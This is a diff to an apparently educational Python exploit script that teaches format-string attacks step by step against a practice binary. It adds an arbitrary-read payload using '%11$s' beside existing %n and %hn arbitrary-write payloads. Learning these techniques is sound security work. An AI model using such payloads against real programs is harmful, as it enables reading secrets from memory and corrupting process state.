@@ -141,14 +141,44 @@ if __name__ == "__main__":
   r.sendline("AAAA%11$p")
   wait_for_prompt(r)
 
+
+
+
+  byte4 = addr_str_upper & 0xff
+  byte3 = (addr_str_upper >> 8) & 0xff
+  byte2 = (addr_str_upper >> 16) & 0xff
+  byte1 = (addr_str_upper >> 24) & 0xff
+  print bcolors.OKBLUE + """
+    Great. So that should have worked. So what does that all mean? How is that useful??
+
+    So you can print a certain stack value. Big deal right???
+
+    Well we should now be able to use that to give us an arbitrary read primitive. 
+    What about the string in memory that contains the uppercase characters.. This could be the location of a super secret passphrase
+    Or the address of a library that is loaded at a random location. But would be really useful to know (when we're not supposed to)
+
+    So we know the address of the string. In this case: {} .
+    So lets format our input string like this: '/x{}/x{}/x{}/x{} The String is:%11$s' (via a python print statement, in order to send the raw bytes)
+    
+    This should result in the str_upper string being printed out.
+    This works because we're telling printf to use the pointer at the 11th stack location as the string
+  """.format(hex(addr_str_upper), hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:])
+
+  wait_any_key()
+  r.sendline(p32(addr_str_upper) + ' The String is:%11$s')
+  wait_for_prompt(r)
+
+
+  
+
   byte4 = addr_intval & 0xff
   byte3 = (addr_intval >> 8) & 0xff
   byte2 = (addr_intval >> 16) & 0xff
   byte1 = (addr_intval >> 24) & 0xff
 
   print bcolors.OKBLUE + """
-    Great. So that should have worked. So what does that all mean? How is that useful? Great, you can print a certain stack value.
-    Big deal right???
+ 
+    Now we have learned a super useful 'read memory from anywhere' trick. What about writing?
 
     Well this is where we introduce the %n parameter. This will write the 'Number of bytes written so far' to a pointer on the stack.
     In a regular usage you would expect to see:
@@ -160,15 +190,18 @@ if __name__ == "__main__":
 
     This gives us a useful write primitive to write arbitrary memory locations. This is really powerful!
 
-    If we take the address of g_intval 0x{} and set that as our first 4 bytes, and then do a %n, we should see g_intval change to 0x4
+    If we take the address of g_intval {} and set that as our first 4 bytes, and then do a %n, we should see g_intval change to 0x4
 
-    Lets try sending '/x{}/x{}/x{}/x{}%11$n'
+    Lets try sending '/x{}/x{}/x{}/x{}%11$n' (via a python print statement, in order to send the raw bytes)
 
   """.format(hex(addr_intval), hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:])
 
   wait_any_key()
   r.sendline(p32(addr_intval) + '%11$n')
   wait_for_prompt(r)
+
+
+
 
 
   byte4 = addr_intval2 & 0xff
@@ -182,7 +215,7 @@ if __name__ == "__main__":
 
     Well we can do that with: %hn which will only write 2 bytes.
     
-    If we take the address of g_intval2 0x{} and set that as our 11th stack position and write the number of written bytes with %hn...     
+    If we take the address of g_intval2 {} and set that as our 11th stack position and write the number of written bytes with %hn...     
     Lets try sending '/x{}/x{}/x{}/x{}%11$hn'
 
   """.format(hex(addr_intval2), hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:])
@@ -210,6 +243,8 @@ if __name__ == "__main__":
   wait_any_key()
   r.sendline(p32(addr_intval2) + '%13120c%11$hn')
   r.clean()
+
+
 
   print bcolors.BOLD + "Lets look at the values now"
   print r.sendline(' ')
